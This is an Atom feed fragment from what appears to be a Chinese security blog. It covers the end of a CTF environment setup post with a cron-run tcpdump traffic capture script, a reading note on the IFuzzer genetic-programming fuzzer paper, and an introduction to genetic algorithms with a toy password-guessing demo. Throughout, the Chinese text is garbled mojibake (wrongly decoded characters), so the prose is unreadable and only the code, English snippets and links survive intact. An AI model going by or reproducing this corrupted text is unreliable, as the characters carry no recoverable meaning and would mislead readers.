<h2 id="0x05-å…¶ä»–æ‚é¡¹é…ç½®"><a href="#0x05-å…¶ä»–æ‚é¡¹é…ç½®" class="headerlink" title="0x05 å…¶ä»–æ‚é¡¹é…ç½®"></a>0x05 å…¶ä»–æ‚é¡¹é…ç½®</h2><p>å®‰è£…32bitåº“</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install libstdc++-devel.i686 glibc.i686 libgcc.i686 libstdc++.i686 glibc-devel.i686</span><br></pre></td></tr></table></figure>
<h2 id="0x06-æŠ“æµé‡"><a href="#0x06-æŠ“æµé‡" class="headerlink" title="0x06 æŠ“æµé‡"></a>0x06 æŠ“æµé‡</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh </span></span><br><span class="line">file_path=<span class="string">"/home/sycfiles/pwn_log/"</span></span><br><span class="line">file_name=`date <span class="string">"+%H%M"</span>`</span><br><span class="line">path=<span class="variable">$file_path</span><span class="variable">$file_name</span></span><br><span class="line">killall  tcpdump233</span><br><span class="line">nohup tcpdump233 -i eth1 tcp port 50001 -w <span class="variable">$path</span>  &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0 */1 * * * ç”¨æˆ· è„šæœ¬è·¯å¾„</span></span><br><span class="line">0 */1 * * *  root   /root/pwn_log.sh</span><br></pre></td></tr></table></figure>
<h2 id="0x07-å…¶ä»–"><a href="#0x07-å…¶ä»–" class="headerlink" title="0x07 å…¶ä»–"></a>0x07 å…¶ä»–</h2><p>ä¸»è¦æ˜¯æ³¨æ„ç›®å½•ã€æ–‡ä»¶æƒé™ä»¥åŠforkç‚¸å¼¹ä¹‹ç±»çš„æ…å±æ£è¡Œä¸ºçš„é™åˆ¶ï¼Œæœ€å¥½è¿˜æ˜¯dockerå§ï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 : å‰è¨€&quot;&gt;&lt;/a&gt;0x00 : å‰è¨€&lt;/h2&gt;&lt;p&gt;åˆæ˜¯ä¸€å±Šæ ¡èµ›äº†ã€‚å­¦å¼Ÿåœ¨é…ç¯å¢ƒçš„æ—¶å€™ä¸€ç›´é—®æˆ‘ç›¸å…³çš„é—®é¢˜ï¼Œç„¶è€Œæˆ‘ä»¥å‰çš„ç¬”è®°æ‰¾ä¸åˆ°äº†ï¼Œä»Šå¤©å¶ç„¶æ‰¾åˆ°äº†ï¼Œç´¢æ€§ç›´æ¥å‘å‡ºæ¥å§ã€‚è¿™æ˜¯ç¬¬ä¸€æ¬¡å‚åŠ æ ¡èµ›æ—¶å€™é…ç¯å¢ƒçš„è®°å½•äº†ï¼Œä¸¤å¹´å‰å§ï¼Œæ¯”è¾ƒnaiveï¼Œæœ‰å¾ˆå¤šåœ°æ–¹ä¸å…¨é¢ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://o0xmuhe.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>è®ºæ–‡é˜…è¯»&lt;IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming&gt;</title>
    <link href="http://o0xmuhe.me/2018/06/09/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-IFuzzer-An-Evolutionary-Interpreter-Fuzzer-using-Genetic-Programming/"/>
    <id>http://o0xmuhe.me/2018/06/09/è®ºæ–‡é˜…è¯»-IFuzzer-An-Evolutionary-Interpreter-Fuzzer-using-Genetic-Programming/</id>
    <published>2018-06-08T16:29:42.000Z</published>
    <updated>2018-06-09T03:45:27.553Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-å…³äº"><a href="#0x00-å…³äº" class="headerlink" title="0x00:å…³äº"></a>0x00:å…³äº</h4><p>æœ€è¿‘åœ¨é˜…è¯»ä¸€äº›æ¼æ´æŒ–æ˜ç›¸å…³æŠ€æœ¯çš„è®ºæ–‡ï¼Œæ­£å¥½è¯»åˆ°è¿™ç¯‡ï¼Œåšä¸ªè®°å½•ã€‚<br>è¿™ç¯‡è®ºæ–‡æ˜¯<code>IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</code>ã€‚<br>ä¸»è¦æ˜¯ä»‹ç»<a href="https://github.com/vspandan/IFuzzer" target="_blank" rel="noopener">IFuzzer</a>çš„ä¸€ç¯‡è®ºæ–‡ï¼Œä¸»è¦æ˜¯åˆ©ç”¨antlr4+é—ä¼ ç®—æ³•æjs fuzzã€‚<br><a id="more"></a></p>
<h4 id="0x01-è®ºæ–‡é˜…è¯»"><a href="#0x01-è®ºæ–‡é˜…è¯»" class="headerlink" title="0x01:è®ºæ–‡é˜…è¯»"></a>0x01:è®ºæ–‡é˜…è¯»</h4><p>è¯¥è®ºæ–‡ä¸»è¦æ˜¯é’ˆå¯¹è„šæœ¬å¼•æ“çš„fuzzï¼Œåªæ˜¯æ–‡ä¸­ä½¿ç”¨äº†js engineä½œä¸ºç›®æ ‡ã€‚</p>
<p>æ ¸å¿ƒæ€æƒ³å°±æ˜¯ï¼šæ”¶é›†å¤§é‡çš„æµ‹è¯•ä»£ç ï¼Œä½¿ç”¨antlr4ç¼–å†™å¥½çš„è¯­æ³•è§£æå™¨è§£æå‡º<code>éç»ˆç»“ç¬¦ç‰‡æ®µ</code>ï¼ŒæŠŠè¾“å…¥è§£ææˆASTåï¼Œåœ¨ASTä¸Šè¿›è¡Œå˜å¼‚ã€‚</p>
<p>å˜å¼‚çš„æ–¹å¼ä¸»è¦æ˜¯åˆ©ç”¨æ”¶é›†çš„â€œç‰‡æ®µâ€å»æ›¿æ¢è§£ææ ‘ä¸­ç›¸åŒéç»ˆç»“ç¬¦ï¼Œç”±äºé‡‡ç”¨äº†é—ä¼ ç®—æ³•ï¼Œé€šè¿‡å¯¹æ¯ä¸ªä¸ªä½“çš„è¯„ä¼°ï¼Œç­›é€‰ä¼˜ç§€çš„ä¸ªä½“è¿›è¡Œâ€œæ‚äº¤â€äº§ç”Ÿæ–°çš„ä¸ªä½“è¿›å…¥ä¸‹ä¸€è½®fuzzï¼Œâ€œæ‚äº¤â€çš„æ–¹æ³•æ˜¯äº¤æ¢ä¸¤ä¸ªä¸ªä½“ä¸­ç›¸åŒçš„éç»ˆç»“ç¬¦èŠ‚ç‚¹ï¼Œäº§ç”Ÿä¸¤æ£µæ–°çš„è¾“ã€‚</p>
<p>é‡‡ç”¨é—ä¼ ç®—æ³•å¿…é¡»é¢å¯¹è†¨èƒ€æ§åˆ¶çš„é—®é¢˜ã€‚è¿™é‡Œè®ºæ–‡ä½œè€…å¯¹æ¯ä¸ªä¸ªä½“è¯„ä¼°æ—¶ï¼Œé‡‡ç”¨äº†å¦‚ä¸‹çš„å…¬å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fb(x) = score_structure + score_feedback</span><br><span class="line">ffinal(x) = fb(x) âˆ’ c âˆ— (l(x))</span><br></pre></td></tr></table></figure>
<p>å³ï¼š</p>
<p>åŸºç¡€å¾—åˆ†=ç»“æ„å¾—åˆ†+(è§£é‡Šå™¨)å›é¦ˆå¾—åˆ†<br>æœ€ç»ˆå¾—åˆ†=åŸºç¡€çš„åˆ†-è†¨èƒ€æ§åˆ¶</p>
<p>è¿™æ ·çš„è¯çš„ç¡®æœ‰æ•ˆçš„æ§åˆ¶äº†é—ä¼ ç®—æ³•åœ¨è¿­ä»£ä¸­çš„è†¨èƒ€é—®é¢˜ã€‚</p>
<p>è®ºæ–‡ä¸­æµ‹è¯•éƒ¨åˆ†æ²¡ä»”ç»†çœ‹ï¼Œæˆ‘åªå…³æ³¨äº†æ ¸å¿ƒçš„ç®—æ³•å’Œä¸€äº›é—®é¢˜çš„è§£å†³ï¼Œå‰©ä¸‹çš„å·¥ä½œå°±æ˜¯å»é˜…è¯»IFuzzerä»£ç å»ä½“ä¼šäº†ã€‚</p>
<h4 id="0x02-ä¸ªäººæƒ³æ³•"><a href="#0x02-ä¸ªäººæƒ³æ³•" class="headerlink" title="0x02:ä¸ªäººæƒ³æ³•"></a>0x02:ä¸ªäººæƒ³æ³•</h4><p>é¦–å…ˆæ„Ÿè§‰è¿™ä¸ªä¸œè¥¿æ²¡é‚£ä¹ˆå®Œå–„ï¼Œæˆ–è€…è¯´æ²¡æ”¾å…¨ã€‚</p>
<p>å˜å¼‚çš„ç­–ç•¥å…¶å®å¯ä»¥æ›´å¤šçš„ï¼Œè¿™ç§æ›¿æ¢çš„æ–¹å¼æ„Ÿè§‰è¿˜æ˜¯æœ‰å±€é™æ€§ï¼Œå…¶å®å°±æ˜¯ç±»ä¼¼äºç”¨ä¸€å¤§å †ç§¯æœ¨ï¼Œå»ç»„åˆï¼Œæ˜¯ä»ç°æœ‰çš„ä¸œè¥¿ç”Ÿæˆä¸€äº›ç»„åˆæ€§çš„ä¸œè¥¿ï¼›å¦‚æœå¯ä»¥åŠ å…¥åˆ›é€ æ€§çš„ä¸œè¥¿å°±å¥½äº†ï¼Œæ¯”å¦‚ç§¯æœ¨çš„å½¢çŠ¶ã€æè´¨æ”¹å˜ï¼Œç„¶åå»åˆ›é€ æ–°çš„ç»„åˆã€‚</p>
<p>è®°å¾—å‡ ä¸ªæœˆå‰çœ‹è¿‡éŸ©å›½ä¸€ä¸ªå¤§ä½¬ï¼ˆBoBè®¡åˆ’çš„å¯¼å¸ˆï¼‰çš„slideï¼Œä»–åšçš„ç±»ä¼¼çš„äº‹æƒ…ï¼Œä½†æ˜¯ä¸ä¸€æ ·çš„æ˜¯ï¼šä»–æŠŠæ”¶é›†çš„æµ‹è¯•ä»£ç ã€pocè§£æååˆ°ASTç„¶ååˆ°IRï¼Œç›´æ¥åœ¨IRä¸Šæ“ä½œï¼Œä¹‹åä»IRå†ç”Ÿæˆjsä»£ç ï¼Œæ•ˆæœä¹Ÿä¸é”™ï¼Œä½†æ˜¯é‚£ä¸ªæ²¡æ”¾å‡ºæºç æ‰€ä»¥ä¹Ÿä¸å¥½ä¸IFuzzeræ¯”è¾ƒã€‚</p>
<p>ä»èº«è¾¹çš„å¤§ä½¬çš„è¯´æ³•æ¥çœ‹ï¼ŒIFuzzerå¾ˆæœ‰é™ï¼Œéœ€è¦æ”¹è¿›çš„åœ°æ–¹å¾ˆå¤š- ã€‚- ä¸è¿‡æˆ‘ä¸ªäººè®¤ä¸ºï¼Œè¿™æ ·çš„æ€è·¯å€¼å¾—å€Ÿé‰´ï¼Œè™½ç„¶å¾ˆå¥½æƒ³ï¼Œä½†æ˜¯éš¾åšå•Šã€‚ã€‚å»å¹´å°±æƒ³è¿™ä¹ˆæäº†ï¼Œç„¶è€Œä¸€äº›åŸºç¡€çŸ¥è¯†è·Ÿä¸ä¸Šï¼Œç°å¦‚ä»Šå¯ä»¥è¯•ä¸€è¯•å•¦ï½</p>
<h4 id="0x03-å¼•ç”¨"><a href="#0x03-å¼•ç”¨" class="headerlink" title="0x03:å¼•ç”¨"></a>0x03:å¼•ç”¨</h4><p><a href="https://link.springer.com/chapter/10.1007/978-3-319-45744-4_29" target="_blank" rel="noopener">IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-å…³äº&quot;&gt;&lt;a href=&quot;#0x00-å…³äº&quot; class=&quot;headerlink&quot; title=&quot;0x00:å…³äº&quot;&gt;&lt;/a&gt;0x00:å…³äº&lt;/h4&gt;&lt;p&gt;æœ€è¿‘åœ¨é˜…è¯»ä¸€äº›æ¼æ´æŒ–æ˜ç›¸å…³æŠ€æœ¯çš„è®ºæ–‡ï¼Œæ­£å¥½è¯»åˆ°è¿™ç¯‡ï¼Œåšä¸ªè®°å½•ã€‚&lt;br&gt;è¿™ç¯‡è®ºæ–‡æ˜¯&lt;code&gt;IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming&lt;/code&gt;ã€‚&lt;br&gt;ä¸»è¦æ˜¯ä»‹ç»&lt;a href=&quot;https://github.com/vspandan/IFuzzer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;IFuzzer&lt;/a&gt;çš„ä¸€ç¯‡è®ºæ–‡ï¼Œä¸»è¦æ˜¯åˆ©ç”¨antlr4+é—ä¼ ç®—æ³•æjs fuzzã€‚&lt;br&gt;
    
    </summary>
    
    
      <category term="fuzz" scheme="http://o0xmuhe.me/tags/fuzz/"/>
    
      <category term="study" scheme="http://o0xmuhe.me/tags/study/"/>
    
      <category term="paper" scheme="http://o0xmuhe.me/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>é—ä¼ ç®—æ³•åˆçª¥</title>
    <link href="http://o0xmuhe.me/2018/06/03/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E5%88%9D%E7%AA%A5/"/>
    <id>http://o0xmuhe.me/2018/06/03/é—ä¼ ç®—æ³•åˆçª¥/</id>
    <published>2018-06-02T17:13:32.000Z</published>
    <updated>2018-06-04T13:13:58.922Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>è¯»Fuzzingç›¸å…³çš„paperçš„æ—¶å€™é‡åˆ°äº†å…³äºé—ä¼ ç®—æ³•çš„é—®é¢˜ï¼Œå…¶å®AFLæ™’æ ·æœ¬ä¹Ÿæ˜¯ç”¨äº†é—ä¼ ç®—æ³•ï¼Œä¸ªäººçš„è¯ä¸€ç›´æ²¡å»æ¢ç©¶ï¼Œæ­£å¥½è¯»paperé‡åˆ°äº†ï¼Œå°±æœäº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡å¥½æ–‡ <a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial</a>ï¼Œçœ‹å®Œä¹‹åä¸€ä¸‹å­æ˜äº†ï¼Œå¹¶ä¸”å¤§å‘¼è¿‡ç˜¾ (å¥½æ–‡ç« å•Š!)</p>
<a id="more"></a>
<h4 id="0x01-è¾¾å°”æ–‡è¿›åŒ–è®º"><a href="#0x01-è¾¾å°”æ–‡è¿›åŒ–è®º" class="headerlink" title="0x01 : è¾¾å°”æ–‡è¿›åŒ–è®º"></a>0x01 : è¾¾å°”æ–‡è¿›åŒ–è®º</h4><p><code>è¾¾å°”æ–‡è®¤ä¸ºï¼Œç”Ÿç‰©ä¹‹é—´å­˜åœ¨ç€ç”Ÿå­˜äº‰æ–—ï¼Œé€‚åº”è€…ç”Ÿå­˜ä¸‹æ¥ï¼Œä¸é€‚è€…åˆ™è¢«æ·˜æ±°ï¼Œè¿™å°±æ˜¯è‡ªç„¶çš„é€‰æ‹©ã€‚ç”Ÿç‰©æ­£æ˜¯é€šè¿‡é—ä¼ ã€å˜å¼‚å’Œè‡ªç„¶é€‰æ‹©ï¼Œä»ä½çº§åˆ°é«˜çº§ï¼Œä»ç®€å•åˆ°å¤æ‚ï¼Œç§ç±»ç”±å°‘åˆ°å¤šåœ°è¿›åŒ–ç€ã€å‘å±•ç€ã€‚</code></p>
<h4 id="0x02-é—ä¼ ç®—æ³•ç®€è¿°"><a href="#0x02-é—ä¼ ç®—æ³•ç®€è¿°" class="headerlink" title="0x02 : é—ä¼ ç®—æ³•ç®€è¿°"></a>0x02 : é—ä¼ ç®—æ³•ç®€è¿°</h4><p>è¿™ä¸ªç®—æ³•çš„æ ¸å¿ƒç†å¿µå¾ˆç®€å•ï¼š<code>å¦‚æœä¸€ä¸ªç§ç¾¤æƒ³æŒç»­å‘å±•ä¸‹å»ï¼Œå°±å¿…é¡»ä¸æ–­çš„æé«˜è‡ªèº«ï¼Œå»é€‚åº”ç¯å¢ƒï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šä¸ªä½“ä¼šäº§ç”Ÿå˜å¼‚ï¼Œé€‚åº”ç¯å¢ƒçš„å˜å¼‚ä¼šä¿ç•™ä¸‹æ¥ï¼Œé—ä¼ ç»™åä»£ï¼Œè¿™ä¹ˆä¸€ä»£ä¸€ä»£çš„ç­›é€‰ä¸‹æ¥ï¼Œç•™ä¸‹æ¥çš„éƒ½æ˜¯æœ€é€‚åº”ç¯å¢ƒçš„ä¸ªä½“ã€‚</code></p>
<p>æˆ‘ä»¬æ‹¿Fuzzä¸¾ä¾‹ï¼Œæ¯ä¸€ä¸ªæ ·æœ¬è¿›å»æ‰€è§¦å‘çš„è·¯å¾„ã€æ‰§è¡Œæ—¶é—´éƒ½æœ‰å·®å¼‚ï¼Œé‚£ä¹ˆå¦‚ä½•å»ç­›é€‰å‡ºæœ‰æ•ˆçš„æ ·æœ¬ï¼Œä»è€Œä»è¿™äº›æ ·æœ¬å†æ¬¡è¿­ä»£å‡ºæ–°ä¸€ä»£æ ·æœ¬ï¼Œä»è€Œè®©æˆ‘ä»¬çš„Fuzzæ›´åŠ æœ‰æ•ˆå‘¢ï¼Ÿ</p>
<p>è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¯„åˆ†è§„åˆ™ï¼ˆç±»æ¯”ç¯å¢ƒé€‚åº”èƒ½åŠ›ï¼‰ï¼Œè¯„åˆ†è¶Šé«˜ï¼Œé‚£ä¹ˆé€‚åº”èƒ½åŠ›å°±è¶Šå¥½ï¼Œåœ¨è¿™æ¬¡æ ·æœ¬å˜å¼‚ä¸­å˜å¼‚çš„éƒ¨åˆ†ï¼ˆç‰¹æ€§ï¼‰ä¼šè¢«ä¿ç•™ä¸‹æ¥ï¼Œé—ä¼ ç»™ä¸‹ä¸€ä»£ã€‚</p>
<p>å‚è€ƒAFLï¼Œå®ƒä½¿ç”¨äº†è·¯å¾„ç­‰ä¿¡æ¯è®¡ç®—ä¸€ä¸ªè¯„åˆ†ï¼Œè¯„åˆ†é«˜çš„æ ·æœ¬ä¿ç•™ï¼ˆè§¦å‘è·¯å¾„å¤šï¼‰ï¼Œé‚£ä¹ˆä»è¿™äº›æ ·æœ¬ä¸­è¿­ä»£ï¼Œå°±å®¹æ˜“äº§ç”Ÿæ›´â€œä¼˜ç§€â€çš„æ ·æœ¬æ–‡ä»¶ã€‚</p>
<p>ä¸‹å›¾é—ä¼ ç®—æ³•çš„ç®€å•æè¿°:</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/genetic_algorithm/GP.png" alt="GP"></p>
<h4 id="0x03-ä¸¾ä¸ªæ —å­"><a href="#0x03-ä¸¾ä¸ªæ —å­" class="headerlink" title="0x03 : ä¸¾ä¸ªæ —å­"></a>0x03 : ä¸¾ä¸ªæ —å­</h4><p>ä¾‹å­æ¥è‡ª<a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial</a></p>
<h5 id="1-demoç®€è¿°"><a href="#1-demoç®€è¿°" class="headerlink" title="1. demoç®€è¿°"></a>1. demoç®€è¿°</h5><p>è¿™é‡Œåˆ›å»ºä¸€ä¸ªå·²çŸ¥é•¿åº¦çš„å¯†ç ç ´è§£ç¨‹åº -ã€‚- ï¼ˆè¿™ä¸å°±æ˜¯æš´åŠ›ç ´è§£å—ï¼Œæ˜¯çš„æ²¡é”™ï¼Œä½†æ˜¯æ€ç»´æ–¹å¼è¦æ¢ä¸€æ¢å•¦ï¼‰</p>
<p>æˆ‘ä»¬é’ˆå¯¹æ²¡é”™è¾“å…¥çš„å­—ç¬¦ä¸²ï¼ˆä¸ªä½“ï¼‰è¿›è¡Œè¯„ä¼°ï¼Œå¾—åˆ°ä¸€ä¸ªè¯„åˆ†ï¼ˆé€‚åº”ç¯å¢ƒæ€§ï¼‰ï¼Œè¿™ä¸ªè¯„åˆ†æŒ‡ç¤ºç€å’Œæ­£ç¡®å¯†ç çš„æ¥è¿‘ç¨‹åº¦ã€‚ç®—æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fitness score = (number of char correct) / (total number of char)</span><br></pre></td></tr></table></figure>
<p>éšåå¯¹è¾“å…¥çš„ä¸²è¿›è¡Œå˜å¼‚ï¼ˆè¿›åŒ–ï¼Œè¿›åŒ–ï¼Œè¿›åŒ–â€¦ï¼‰ï¼Œç„¶åå¯¹äºæ–°ä¸€ä»£çš„ç¾¤ä½“ï¼Œè¿›è¡Œè¯„åˆ†ï¼ŒæŒ‘é€‰åˆé€‚çš„ä¸ªä½“ä½œä¸ºç¬¬äºŒä»£ï¼Œç„¶åä»ç¬¬äºŒä»£ä¸­è¿­ä»£äº§ç”Ÿæ–°çš„ä¸ªä½“ã€‚</p>
<p>äº§ç”Ÿä¸‹ä¸€ä»£çš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œæ¯”å¦‚æˆ‘ä»¬æœ‰ä¸¤ä¸ªä¸ªä½“å«åšTomå’ŒJerryï¼Œä»–ä»¬çš„åä»£åå­—çš„å­—æ¯å°±ä»ä¸¤è€…åå­—å­—æ¯ä¸­å–å°±å¥½äº†ã€‚</p>
<p>ç»å†ä¸Šè¿°çš„è¿‡ç¨‹ï¼Œä¸€ä»£ä¸€ä»£çš„è¿›åŒ–ï¼Œæœ€ç»ˆä¸€å®šä¼šå¾—åˆ°æ­£ç¡®çš„å¯†ç ã€‚</p>
<h5 id="2-ä¸€ç‚¹é—®é¢˜"><a href="#2-ä¸€ç‚¹é—®é¢˜" class="headerlink" title="2. ä¸€ç‚¹é—®é¢˜"></a>2. ä¸€ç‚¹é—®é¢˜</h5><p>ä½†æ˜¯é—®é¢˜æ¥äº†ï¼è¿™ä¹Ÿæ˜¯ä»Šå¤©æˆ‘åœ¨çœ‹è®ºæ–‡æ—¶å‘ç°çš„ä¸€ä¸ªé—®é¢˜-ã€‚- </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bloating: </span><br><span class="line">Bloating [16] is a phenomenon that adversely affects input generation in evolutionary computing. </span><br><span class="line">There are two types of bloating: structural and functional bloating.</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼šStructural Bloatingå’ŒFunctional Bloatingã€‚</p>
<p>ç¬¬ä¸€ç§ä¸»è¦æ˜¯ç»è¿‡å¤šä»£çš„è¿­ä»£åï¼Œç»è¿‡xxä»£ï¼Œä¸ªä½“çš„å¹³å‡è§„æ¨¡ä¸å—æ§åˆ¶çš„å¢é•¿ä»è€Œå¯¼è‡´ä»£ç æ•ˆç‡ä¸‹é™ï¼Œåç»­çš„å¢é•¿ä¹Ÿæ— å¼‚äºæé«˜é€‚åº”åº¦ï¼ˆé€‚åº”åº¦ï¼Œå°±æ˜¯ä¾‹å­ä¸­çš„fitnessï¼‰ã€‚</p>
<p>ç¬¬äºŒç§æ˜¯æŒ‡åœ¨è¿›åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœåªæŒ‘é€‰å¥½çš„æ ·æœ¬ï¼ˆé«˜è¯„åˆ†ï¼‰ï¼Œé‚£ä¹ˆä½ å¾—åˆ°çš„æ ·æœ¬ä¼šå¿«é€Ÿæ”¶æ•›åœ¨ä¸€ä¸ªèŒƒå›´å†…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ çš„æ ·æœ¬çš„ç‰¹å¾å°±è¶‹äºä¸€ä¸ªæ–¹å‘ã€‚å¯¹äºæˆ‘ä»¬è¿™ä¸ªå¯†ç ç ´è§£ç¨‹åºï¼Œå½“ç„¶okå•¦ï¼Œä½†æ˜¯å¯¹äºFuzzçš„è¯æ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬éœ€è¦å¤šç§å¤šæ ·çš„æ ·æœ¬è€Œä¸æ˜¯è¶‹è¿‘äºæŸä¸€ç§ç±»å‹çš„æ ·æœ¬ã€‚</p>
<h5 id="3-ä»£ç "><a href="#3-ä»£ç " class="headerlink" title="3. ä»£ç "></a>3. ä»£ç </h5><p>åŸæ–‡ä½œè€…çš„ä»£ç åœ¨è¿™é‡Œï¼š<br><a href="https://gist.github.com/NicolleLouis/d4f88d5bd566298d4279bcb69934f51d" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial_source_code</a></p>
<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python3 passwordTuto.py</span><br><span class="line">solution: <span class="string">"banana"</span> de fitness: 100.0</span><br><span class="line">18.69589400291443</span><br></pre></td></tr></table></figure>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/genetic_algorithm/image_GP.png" alt="result"></p>
<h4 id="0x04-ä¸€ç‚¹ä¸ªäººçœ‹æ³•"><a href="#0x04-ä¸€ç‚¹ä¸ªäººçœ‹æ³•" class="headerlink" title="0x04 : ä¸€ç‚¹ä¸ªäººçœ‹æ³•"></a>0x04 : ä¸€ç‚¹ä¸ªäººçœ‹æ³•</h4><p>æˆ‘è§‰å¾—è¿™ä¸ªç®—æ³•å¯¹äºæ¼æ´æŒ–æ˜ï¼Œæ— ç–‘æ˜¯å¢å¼ºå‹buffï¼Œé€šè¿‡åˆç†çš„ä½¿ç”¨ï¼Œèƒ½å¤Ÿæœ‰æ•ˆçš„æå‡æ ·æœ¬è´¨é‡ï¼Œä»è€Œæé«˜fuzzçš„æ•ˆç‡ã€‚ä½†æ˜¯æ–‡ä¸­æåˆ°çš„<code>Bloating</code>çš„é—®é¢˜ï¼Œæ— ç–‘ä¹Ÿæ˜¯éœ€è¦å»è€ƒè™‘ç„¶ååŠ ä»¥å¹²é¢„çš„ã€‚</p>
<h4 id="0x05-å‚è€ƒåŠå¼•ç”¨"><a href="#0x05-å‚è€ƒåŠå¼•ç”¨" class="headerlink" title="0x05 : å‚è€ƒåŠå¼•ç”¨"></a>0x05 : å‚è€ƒåŠå¼•ç”¨</h4><ol>
<li><a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial</a></li>
<li><a href="https://gist.github.com/NicolleLouis/d4f88d5bd566298d4279bcb69934f51d" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial_source_code</a></li>
<li>IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h4&gt;&lt;p&gt;è¯»Fuzzingç›¸å…³çš„paperçš„æ—¶å€™é‡åˆ°äº†å…³äºé—ä¼ ç®—æ³•çš„é—®é¢˜ï¼Œå…¶å®AFLæ™’æ ·æœ¬ä¹Ÿæ˜¯ç”¨äº†é—ä¼ ç®—æ³•ï¼Œä¸ªäººçš„è¯ä¸€ç›´æ²¡å»æ¢ç©¶ï¼Œæ­£å¥½è¯»paperé‡åˆ°äº†ï¼Œå°±æœäº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡å¥½æ–‡ &lt;a href=&quot;https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;getting-started-genetic-algorithms-python-tutorial&lt;/a&gt;ï¼Œçœ‹å®Œä¹‹åä¸€ä¸‹å­æ˜äº†ï¼Œå¹¶ä¸”å¤§å‘¼è¿‡ç˜¾ (å¥½æ–‡ç« å•Š!)&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>Antlr4åˆä½“éªŒ</title>
    <link href="http://o0xmuhe.me/2018/05/29/Antlr4%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://o0xmuhe.me/2018/05/29/Antlr4åˆä½“éªŒ/</id>
    <published>2018-05-29T07:32:36.000Z</published>
    <updated>2018-05-29T08:05:53.798Z</updated>
    
